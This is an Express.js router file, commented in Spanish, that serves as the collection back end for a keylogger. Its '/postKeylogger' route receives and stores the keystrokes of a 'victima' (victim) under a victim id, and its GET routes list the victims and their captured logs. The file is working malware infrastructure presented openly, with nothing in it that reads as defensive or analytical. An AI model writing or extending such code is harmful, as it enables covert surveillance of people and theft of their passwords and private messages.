//importar la libreria de express
const express = require('express');
//importar el router de express
const router=express.Router();
//importar el servicio para log de usuario
const UserLogService = require('./../services/userLogService');
//crear una instancia del   servicio de log 
const service = new UserLogService();
//crear una ruta apuntando al path principal del proyecto cuando se ejecute el metodo get
router.get('/', async (req, res) => {
  //intentar
    try {
  // llamar al servicio de traer todos lo valores de la tabla victima
  //se coloca el await por que es una funcion asincrona y no se tiene la certeza de saber cuando devuelve sus valores
        const users = await service.find();
        //imprimir la respuesta del metodo
        res.json(users);
        //capturar los errores
      } catch (error) {
        next(error);
      }
});


//crear la ruta del servicio rest para obtener los log de la victima
router.get('/getLog', async (req, res) => {
  try {
    //obtener los log de la victima
      const users = await service.getLogList();
      //imprimir la respuesta del metodo
      res.json(users);
      //retornar la respuesta del servicio 
      return users;
      //capturar los errores
    } catch (error) {
      next(error);
    }
});


//crear la ruta a  donde el keylogger enviara las entradas de teclado de  la  victima
router.post('/postKeylogger',async (req,res)=>{
  try{
    //guardar en una variable lo  que envia el usuario
    const body=req.body;
    //ejecutar la funcion para guardar las entradas del usuario pasando como parametros el id de la victima y las ultimas entradas de la victima
    const log= await service.postLog(body.victima_id,body.log);
    // imprimir la  respuesta de la funcion
    res.json(log);
    //capturar los  errores
  }catch(error){
    console.log(error);
  }
});


//exportar este modulo al router
module.exports=router;